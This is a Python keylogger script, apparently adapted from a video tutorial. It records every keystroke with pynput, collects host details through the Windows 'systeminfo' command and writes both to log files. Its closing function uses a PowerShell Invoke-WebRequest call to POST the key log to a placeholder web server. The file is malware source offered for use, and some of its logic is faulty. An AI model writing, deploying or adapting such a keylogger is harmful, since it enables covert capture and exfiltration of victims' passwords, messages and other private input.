'''
A few tweeks were made to this code, but most of it can be found in the
following tutorial: https://www.youtube.com/watch?v=TbMKwl11itQ
'''

from pynput.keyboard import Key, Listener
import os

key_log = "<PATH TO YOUR LOG FILE>"
system_log = "<PATH TO SYSTEM INFO LOG FILE>"

def system_info():
    '''getting the system info of the host using the command `systeminfo`'''
    sysinfo = os.popen("systeminfo").read()
    try:
        with open(system_log, "a") as f:
            for line in f:
                if line.find("Hostname"): # checking if the system info has been gathered already
                    pass
                else:
                    f.write(str(sysinfo))
    except:
        with open(system_log, "w") as f:
            f.write(str(sysinfo)) 
system_info()


count = 0
keys = []

def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    if count >= 5: # log file will be updated after 5 keystrokes 
        count = 0
        log_keys(keys)
        keys = []

def on_release(key):
    '''killing the script if ESC is pressed'''
    if key == Key.esc:
        return False
        
def log_keys(keys):
    try:
        with open(key_log, "a") as f:
            for key in keys:
                k = str(key).replace("'", "") # replacing the quotation marks for the letters
                if k.find("space") > 0:
                    f.write("\n") # printing new line each time space is pressed
                elif k.find("Key") == -1:
                    f.write(k)
    except:
        with open(key_log, "w") as f:
            for key in keys:
                f.write(str(key))

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

def send_file():
    '''command to send the log file via a webrequest'''
    send = os.popen("powershell Invoke-WebRequest -Uri <WEBSERVER URL> -Method POST -InFile key_log.txt")
send_file()
